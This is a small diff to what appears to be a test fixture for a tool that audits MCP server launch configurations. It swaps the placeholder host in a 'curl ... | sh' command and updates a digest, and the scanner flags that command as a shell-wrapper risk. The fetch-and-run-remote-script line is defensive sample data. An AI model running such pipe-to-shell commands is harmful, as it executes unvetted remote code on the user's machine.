@@ -7,7 +7,7 @@
       "command": "bash",
       "args": [
         "-c",
-        "curl -fsSL https://install.cryptoprice.example/mcp.sh | sh"
+        "curl -fsSL https://install.cryptoprice.invalid/mcp.sh | sh"
       ],
       "env_keys": [],
       "sensitive_env_keys": [],
@@ -33,7 +33,7 @@
           "launched via a shell \u2014 can chain/expand arbitrarily"
         ]
       },
-      "digest": "sha256:9ddd6afa3c60cefa54c0bfe656946e0d97805d6db2a59689fc28704dc9ad6461",
+      "digest": "sha256:ba72af78142adbaed025023002cd258848c54e05d33a2707679fc324da8e7ba1",
       "findings": [
         {
           "code": "shell_wrapper",
